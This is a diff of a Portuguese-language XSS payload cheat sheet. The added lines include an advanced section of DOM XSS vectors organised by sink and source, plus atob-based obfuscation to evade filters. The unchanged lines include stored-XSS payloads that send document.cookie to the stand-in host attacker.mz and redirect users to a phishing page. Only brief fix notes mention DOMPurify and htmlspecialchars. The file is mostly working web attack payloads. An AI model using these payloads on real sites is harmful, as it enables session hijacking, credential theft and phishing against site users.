@@ -53,15 +53,18 @@ ALTA
 <svg onload=alert&lpar;1&rpar;>        # parênteses como entidade HTML
 <img src=x onerror="window[`al`+`ert`](1)">  # alert montado por partes
 
+
+CORRECAO DA FALHA
+
+DOMPurify PARA TEXTO COMO OS DE BLOGS QUE PRECISAM RECEBER ALGUNS HTML PARA FORMATAR O ARTIGO
+
 # ───── XSS ARMAZENADO (fica guardado) ─────
 <script>alert(document.domain)</script>
 <img src=x onerror=alert(1)>
 <script>new Image().src='//attacker.mz/c?='+document.cookie</script>
 
 
-CORRECAO DA FALHA
 
-DOMPurify PARA TEXTO COMO OS DE BLOGS QUE PRECISAM RECEBER ALGUNS HTML PARA FORMATAR O ARTIGO
 
 PARA COMPOS NO GERAR
 htmlspecialchars
@@ -121,3 +124,42 @@ javascript:alert(1)
 # ───── PROVAR IMPACTO ─────
 <script>fetch('//attacker.mz/s?c='+document.cookie)</script>
 <script>location='//attacker.mz/phish'</script>
+
+AVANCADO
+# ═══ DOM XSS — vetores no fragmento (#), variados ═══
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+#<iframe src=javascript:alert(1)>
+#<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+#<video><source onerror=alert(1)>
+#<details open ontoggle=alert(1)>
+
+# ═══ Quando o sink é eval / setTimeout (JS puro, SEM tags) ═══
+#;alert(1)
+#');alert(1);//
+#'-alert(1)-'
+#"];alert(1);//
+
+# ═══ Quando o sink é innerHTML (precisa de evento, não de <script>) ═══
+#<img src=x onerror=alert(document.domain)>
+#<svg/onload=alert(1)>
+#<a href=javascript:alert(1)>x</a>
+
+# ═══ Quando o sink é jQuery $(location.hash) / .html() ═══
+#<img src=x onerror=alert(1)>
+#<div><img src=1 onerror=alert(1)></div>
+
+# ═══ Via javascript: em links (sink = location/href) ═══
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:eval(atob('YWxlcnQoMSk='))
+
+# ═══ Outras SOURCES de DOM (não só o hash) ═══
+# window.name  → pões o payload no name de uma janela/iframe
+# document.referrer → payload na URL de onde vieste
+# location.search → ?param=<img src=x onerror=alert(1)>  (lido por JS, não pelo servidor)
+?q=<img src=x onerror=alert(1)>
+
+# ═══ Esconder a string (sink + filtro de "alert"/"script") ═══
+#<img src=x onerror=top[atob('YWxlcnQ=')](1)>
+#<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
